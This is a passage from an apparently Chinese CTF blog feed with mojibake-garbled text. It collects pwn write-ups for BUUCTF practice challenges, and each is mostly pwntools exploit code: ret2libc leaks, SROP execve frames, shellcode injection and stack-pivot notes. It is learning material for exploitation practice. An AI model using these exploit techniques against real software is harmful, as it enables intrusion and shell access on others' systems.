é€’ç»™ebx<br>ï¼ˆ6ï¼‰pushl %eax<br>        pushl %ebx ï¼šåœ¨æ ˆä¸­æ„é€ Nameæ•°ç»„ï¼Œebxå­˜å‚¨äº†â€/bin/shâ€å­—ç¬¦ä¸²çš„åœ°å€ï¼Œeaxä¸­ä¸º0ï¼Œä½œä¸ºName[1]ï¼›<br>ï¼ˆ7ï¼‰movl %esp,%ecx :espæŒ‡å‘æ„é€ çš„Nameæ•°ç»„ï¼Œå°†å…¶ä¿å­˜åœ¨ecxä¸­<br>ï¼ˆ8ï¼‰cdq ï¼šæ¸…ç©ºedxï¼Œedxä¸­å­˜æ”¾ç¯å¢ƒå˜é‡ï¼Œ0ä»£è¡¨ä¸ä¼ é€’ç¯å¢ƒå˜é‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨xorl %edx %edx,ä½†æ˜¯è¯¥æŒ‡ä»¤æ›´é•¿ã€‚<br>ï¼ˆ9ï¼‰movb $0x0b,%al<br>         int $0x80ï¼šeaxå­˜å‚¨ç³»ç»Ÿè°ƒç”¨å·11ï¼ˆ0x0bï¼‰,intæŒ‡ä»¤è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œhhhnooneã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_40712959/article/details/103832987">https://blog.csdn.net/qq_40712959/article/details/103832987</a></p></blockquote><hr><p>è°ƒä¸å‡ºæ¥çš„å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_s_9&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./ciscn_s_9&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/robye/Desktop/PWN/libc/32-libc-2.27.so&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>    pop2_ret = <span class="hljs-number">0x080485da</span><br>    payload = cyclic(<span class="hljs-number">36</span>)<br>    payload += p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    payload += p32(<span class="hljs-number">0x80484BB</span>)<br>    payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    <span class="hljs-comment">#payload += p32(0x8048559)</span><br>    <span class="hljs-comment">#payload += p32(0x80484BB)</span><br>    <span class="hljs-comment">#pause()</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)<br>    __libc_start_main = u32(sh.recv(<span class="hljs-number">4</span>))<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">36</span>)<br>    <span class="hljs-comment">#payload += p32(0x08048359)</span><br>    <span class="hljs-comment">#payload += p32(0x080485da)#pop_rdi_ebp</span><br>    payload + p32(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#payload += p32(system)</span><br>    <span class="hljs-comment">#payload += p32(0xdeadbeef) </span><br>    <span class="hljs-comment">#payload += p32(system)</span><br>    <span class="hljs-comment">#payload += p32(0)</span><br>    <span class="hljs-comment">#payload += p32(0xdeadbeef)</span><br>    payload += p32(binsh)<br>    <span class="hljs-comment">#payload += &#x27;cat flag&#x27;</span><br>    <span class="hljs-comment">#payload += p32(0xdeadbeef)</span><br>    payload += p32(system)<br>    pause()<br>    sh.sendline(payload)<br>    <span class="hljs-comment">#__free_hook = libc + lib.symbols[&#x27;__free_hook&#x27;]</span><br>    <span class="hljs-comment">#__malloc_hook = libc + lib.symbols[&#x27;__malloc_hook&#x27;]</span><br>    <span class="hljs-comment">#log.success(&quot;libc: &quot; + hex(libc))</span><br>    <span class="hljs-comment">#log.success(&quot;system: &quot; + hex(system))</span><br>    <span class="hljs-comment">#log.success(&quot;binsh: &quot; + hex(binsh))</span><br>    <span class="hljs-comment">#log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br>    <span class="hljs-comment">#log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27831</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP-ciscn_2019_s_3</title>
    <link href="/2020/01/23/SROP-ciscn_2019_s_3/"/>
    <url>/2020/01/23/SROP-ciscn_2019_s_3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/network/87447.html">Sigreturn Oriented Programming (SROP) Attackæ”»å‡»åŸç†</a></p><p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">æ¯”è¾ƒè¯¦ç»†çš„WP</a></p><p><a href="https://www.jianshu.com/p/ca4a5dacd1a2">https://www.jianshu.com/p/ca4a5dacd1a2</a></p><blockquote><p>ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸€ä¸ªæ˜¯sys_readï¼Œä¸€ä¸ªæ˜¯sys_writeï¼Œå¾€æ ˆä¸Šå†™æ•°æ®ï¼ˆ0x400ï¼‰ï¼Œä»æ ˆä¸Šè¯»æ•°æ®ï¼ˆ0x30ï¼‰ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚<br>è¿˜æœ‰ä¸€ä¸ªgadgetå‡½æ•°ã€‚</p><img src="/2020/01/23/SROP-ciscn_2019_s_3/20191214171639948.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><p>æœ‰ä¸¤ä¸ªå€¼å¾—æ³¨æ„çš„åœ°æ–¹ã€‚mov rax,0fh ä»¥åŠmov rax 59ã€‚è¿™ä¸¤ä¸ªgadgetæ§åˆ¶äº†raxçš„å€¼ï¼Œçœ‹çœ‹è¿™ä¸¤ä¸ªæ˜¯ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨ã€‚<br>15 sys_rt_sigreturn<br>59 sys_execve</p><p>è§£æ³•ä¸€<br>59å·ç³»ç»Ÿè°ƒç”¨æ˜¯execveé‚£ä¹ˆå°±å¯ä»¥æƒ³åŠæ³•æ§åˆ¶å¯„å­˜å™¨çš„å€¼è°ƒç”¨execve(â€œ/bin/shâ€,0,0)ï¼Œæ³¨æ„åœ¨è°ƒç”¨execveæ—¶ï¼Œåé¢ä¸¤ä¸ªå‚æ•°éœ€è¦ç½®0ï¼Œç”±äºéœ€è¦æ§åˆ¶rdxçš„å€¼ï¼Œæ‰€ä»¥é€‰æ‹©ä½¿ç”¨é€šç”¨gadgetï¼Œ__libc_csu_initã€‚</p><p>r13çš„å€¼ä¼šç»™åˆ°rdxï¼Œè®©rbx=0ï¼Œä¸‹é¢callçš„æ—¶å€™ä¼šå˜ä¸ºcall [r12]ï¼Œä¼šå»call r12æŒ‡å‘ä½ç½®çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒåˆ°åé¢çš„ropæ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦çŸ¥é“æ ˆçš„åœ°å€ï¼Œæˆ‘ä»¬è·å–/bin/shå­—ç¬¦ä¸²æ—¶ä¹Ÿéœ€è¦çŸ¥é“æ ˆåœ°å€ã€‚è¿™é¢˜åˆšå¥½åœ¨writeçš„æ—¶å€™0x28è¿™ä¸ªä½ç½®æ˜¯æ ˆä¸Šçš„å€¼ï¼Œäºæ˜¯é€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ°æ ˆä¸Š/bin/shçš„åœ°å€ï¼Œå³rsp-0x10çš„å€¼ã€‚</p><p>from pwn import *</p><p>io=process(â€˜pwnâ€™)<br>main=0x0004004ED<br>execv=0x04004E2<br>pop_rdi=0x4005a3<br>pop_rbx_rbp_r12_r13_r14_r15=0x40059A<br>mov_rdxr13_call=0x0400580<br>sys_write=0x00400517</p><p>pl1=â€™/bin/sh\x00â€™*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280<br>print(hex(sh))</p><p>pl2=â€™/bin/sh\x00â€™<em>2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)</em>2+p64(sh+0x50)+p64(0)*3<br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys_write)<br>io.send(pl2)</p><p>io.interactive()</p><p>è§£æ³•2<br>15å·ç³»ç»Ÿè°ƒç”¨sigreturnã€‚è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯åœ¨ç»ˆæ­¢ä¿¡å·æ¢å¤ç”¨æˆ·æ€ç¯å¢ƒæ—¶ç”¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨æ ˆä¸Šä¼ªé€ å¯„å­˜å™¨çš„å€¼ï¼Œé‚£ä¹ˆæ¢å¤æ—¶å°±å¯å°†å¯„å­˜å™¨æ§åˆ¶ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚<br>å…·ä½“å¯å‚è€ƒï¼šFraming Signalsâ€”A Return to Portable Shellcode</p><p>from pwn import *</p><p>io=process(â€˜pwnâ€™)<br>context.binary=â€™./pwnâ€™<br>context.terminal = [â€˜gnome-terminalâ€™,â€™-xâ€™,â€™shâ€™,â€™-câ€™]</p><p>main=0x0004004ED<br>sigret=0x4004DA<br>sys_write=0x400517</p><p>pl1=â€™/bin/sh\x00â€™*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280 #shå€¼ä¸ºbinshæ‰€åœ¨çš„ä½ç½®<br>print(hex(sh))</p><p>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = sh<br>frame.rsi = 0<br>frame.rdx = 0<br>frame.rip = sys</p><p>pl1=â€™aâ€™*16+p64(sigret)+p64(sys_write)+str(frame)</p><p>â€˜â€™â€™<br>def debug(addr):<br>   raw_input(â€˜debug:â€™)<br>   gdb.attach(io, â€œb *â€ + addr)<br>debug(â€˜0x400514â€™)<br>â€˜â€™â€™</p><p>pl2=â€™/bin/sh\x00â€™*2+p64(sigret)+p64(sys_write)+str(frame)<br>io.send(pl2)</p><p>io.interactive()<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œyudhuiã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/github_36788573/article/details/103541178">https://blog.csdn.net/github_36788573/article/details/103541178</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_ne_5-éªšéªšçš„å°ä¸œè¥¿</title>
    <link href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/"/>
    <url>/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122326853.png" class="" title="image-20200120122326853"><img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122344691.png" class="" title="image-20200120122344691"><p>è¾“å…¥ä¹‹åï¼Œåœ¨è°ƒç”¨getflagè¿™é‡Œä¼šé€ æˆæº¢å‡º</p><img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122455793.png" class="" title="image-20200120122455793"><p>å‡½æ•°é‡Œè°ƒç”¨æœ‰systemï¼Œä½†æ²¡æœ‰/bin/sh</p><p>éªšä¸œè¥¿ï¼š<img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122604385.png" class="" title="image-20200120122604385"></p><p>0x80482E6 + 0x4å°±æ˜¯ sh</p><p>æˆ‘ä»¬å¯ä»¥system(â€œshâ€)ä¹Ÿå¯ä»¥</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#sh = process(&#x27;ciscn_2019_ne_5&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27887</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<br><br>pop_ret = <span class="hljs-number">0x08048455</span><br>sh.sendline(<span class="hljs-string">&quot;administrator&quot;</span>)<br>system = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = (<span class="hljs-number">0x80482E6</span> + <span class="hljs-number">0x4</span>)<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x48</span>)<br>payload += p32(pop_ret)<br>payload += p32(system)<br>payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>payload += p32(binsh)<br><span class="hljs-comment">#pause()</span><br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ez_pz_hackover_2016-ç»§ç»­æ·±å…¥å­¦ä¹ edb</title>
    <link href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/"/>
    <url>/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225637137.png" class="" title="image-20200118225637137"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225650607.png" class="" title="image-20200118225650607"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225709949.png" class="" title="image-20200118225709949"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225720760.png" class="" title="image-20200118225720760"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225751402.png" class="" title="image-20200118225751402"><p>å¾—å…ˆç»•è¿‡resultçš„strcmp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">200</span>)<br>pause()<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><p>pauseæ—¶ï¼Œæ‰“å¼€edbå¹¶attach ez_pz_hackover_2016</p><p>æˆ‘å¸¸ç”¨ï¼šf8å•æ­¥è¿è¡Œï¼Œctrl+f9ç›´æ¥è·³åˆ°retï¼Œshift+f7è¿›å…¥å‡½æ•°è¿è¡Œ</p><blockquote><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230956502.png" class="" title="image-20200118230956502"></blockquote><p>ä¸€ç›´è¿è¡Œåˆ°ä¸èƒ½è¿è¡Œ</p><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230622786.png" class="" title="image-20200118230622786"><p>è®¡ç®—å¾—åç§»ä¸º16ã€‚</p><p>ç„¶åï¼Œä¸€å¼€å§‹ç»™å‡ºäº†&amp;sçš„åœ°å€ï¼ŒåŠ ä¸Šæ²¡æœ‰æ‰“å¼€nxã€‚æˆ‘ä»¬å°±å¯ä»¥åœ¨memcpyï¼Œæº¢å‡ºä¹‹åï¼Œå°†è¿”å›æŒ‡é’ˆæŒ‡å‘&amp;sé‡Œçš„shellcode</p><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118231945729.png" class="" title="image-20200118231945729"><p>ä¸€ç›´è¿è¡Œåˆ°vulnçš„retä¹‹åï¼Œæˆ‘ä»¬çœ‹è§äº†è¿”å›åœ°å€æ—¶0xffb64b7c,ç„¶åæˆ‘ä»¬çš„shellcodeåœ¨0xffb64b60ï¼Œæ‰€ä»¥åç§»å°±æ˜¯0xffb64b7c-0xffb64b60 = 0x1c </p><p>å¾—exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>sh = process(<span class="hljs-string">&#x27;ez_pz_hackover_2016&#x27;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node3.buuoj.cn&quot;,27058)</span><br>elf = ELF(<span class="hljs-string">&quot;./ez_pz_hackover_2016&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/ld-linux.so.2&quot;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;crash: &quot;</span>)<br>s_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">16</span>)<br>payload += p32(s_addr - <span class="hljs-number">0x1c</span>)<br>payload += asm(shellcraft.sh())<br>pause()<br>sh.sendline(payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ç§ret2libcçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#sh = process(&#x27;ez_pz_hackover_2016&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29601</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ez_pz_hackover_2016&quot;</span>)<br><span class="hljs-comment">#lib = ELF(&quot;/lib/ld-linux.so.2&quot;)</span><br>lib = ELF(<span class="hljs-string">&quot;/home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&quot;</span>)<br>chall_addr = <span class="hljs-number">0x8048603</span><br>sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">16</span>)<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>payload += p32(chall_addr) <br>payload +=  p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>sh.sendline(payload)<br><br>sh.recvuntil(<span class="hljs-string">&quot;crashme!\n&quot;</span>)<br>printf_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&quot;printf_addr ----&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(printf_addr))<br>libc = printf_addr - lib.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc ----&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>system = lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc<br>binsh = lib.search(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).<span class="hljs-built_in">next</span>() + libc<br><br>sh.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload = <span class="hljs-string">&quot;crashme&quot;</span><br>payload = payload.ljust(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>payload += cyclic(<span class="hljs-number">16</span>)<br>payload += p32(system)<br>payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>payload += p32(binsh)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>å€Ÿé‰´:<a href="https://sh1ner.github.io/2019/09/13/buuctf-pwn/#more">[sh1nerâ€™s blog]</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ ˆè¿ç§»</title>
    <link href="/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <url>/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<p>åŠ«æŒä¸€æ¬¡æµç¨‹ï¼Œè¦†ç›–ä¸€æ¬¡ebp</p><p>æ ˆè¿ç§»åè·³åˆ°read</p><p>æ­£å¸¸Ropåˆ°libcï¼Œå†ropï¼Œå†åˆ°libc</p><p>ropåˆ°libcï¼Œç”±äºè·³åˆ°readä¸Šï¼Œåé¢å¯ä»¥ç»§ç»­ä»»æ„åœ°å€è·³è½¬</p><p>pop_ret</p><p>leave_ret  </p><p>payload += elf.plt[â€˜putsâ€™]</p><p>payload += p32(pop_ebp_ret)</p><p>payload += p32(elf.got[â€œ__libc_startâ€])</p><p>payload += addr</p><p>payload += p32(leave_ret)</p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225539782.png" alt="image-20200109225539782"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225754002.png" alt="image-20200109225754002"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225805110.png" alt="image-20200109225805110"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109231149390.png" alt="image-20200109231149390"></p><p>æ²¡è°ƒç”¨å‡½æ•°ï¼Œå‡½æ•°çš„gotå€¼æŒ‡å‘ç”¨æˆ·ä»£ç æ®µï¼Œè‹¥è¢«æ‰§è¡Œè¿‡ä¼šæŒ‡å‘libcè¯¥å‡½æ•°çš„</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>å¸¸ç”¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget-not_the_same_3dsctf_2016</title>
    <link href="/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/"/>
    <url>/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/</url>
    
